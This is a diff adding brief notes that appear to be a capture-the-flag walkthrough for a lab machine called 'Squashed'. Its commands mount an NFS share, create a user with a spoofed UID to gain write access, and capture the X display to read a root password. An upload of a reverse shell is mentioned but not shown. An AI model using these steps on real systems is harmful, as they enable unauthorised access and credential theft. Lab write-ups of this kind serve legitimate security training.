@@ -1,0 +1,20 @@
+# Ran an nmap scan on the machine.
+# RPCBind is open and we can mount users home 
+# Grabbed a keepass file
+# The keepass file seemed to be a dead end..
+# nfs file shares use the userid to determine ownership of the files. The owner of this directory is a user with an id of 1001. Knowing this we can make a user with the specified id:
+# I mount the directory
+sudo mount -t nfs 10.10.11.191:/var/www/html ~/HTB/squashed/webshare -o nolock
+# I cant view /var/www/html, as I dont have the right permissions. Owner has UID of 2017
+# Creating user rosehacks and giving him UID of 2017
+sudo useradd rosehacks
+sudo usermod -u 2017 rosehacks
+su rosehacks
+# Can view and upload to the directory now.
+# I upload a reverse shell and get a shell as Alex
+# Priv Escalation 
+xdpyinfo -display :0
+xwd -root -display :0 -out desktop.xwd
+xwud -in desktop.xwd
+# The root password is revealed from this screenshot
+
